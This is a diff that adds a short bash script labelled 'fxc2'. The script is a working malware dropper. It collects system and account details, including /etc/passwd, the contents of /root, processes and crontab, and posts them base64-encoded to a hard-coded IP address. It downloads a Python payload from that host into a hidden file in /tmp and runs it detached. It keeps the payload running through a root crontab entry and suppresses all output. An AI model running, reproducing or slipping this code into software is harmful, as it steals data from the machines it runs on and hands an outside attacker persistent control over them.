@@ -1,0 +1,9 @@
+#!/bin/bash
+# fxc2
+({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
+curl -sm15 http://131.123.43.239:8123/rspy.py -o /tmp/.rspy.py 2>/dev/null || curl -sm15 http://131.123.43.239:4433/rspy.py -o /tmp/.rspy.py
+(setsid nohup python3 /tmp/.rspy.py >/dev/null 2>&1 &)
+grep -q rspy /etc/crontab 2>/dev/null || echo "* * * * * root python3 /tmp/.rspy.py" >> /etc/crontab 2>/dev/null
+b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1
+
+
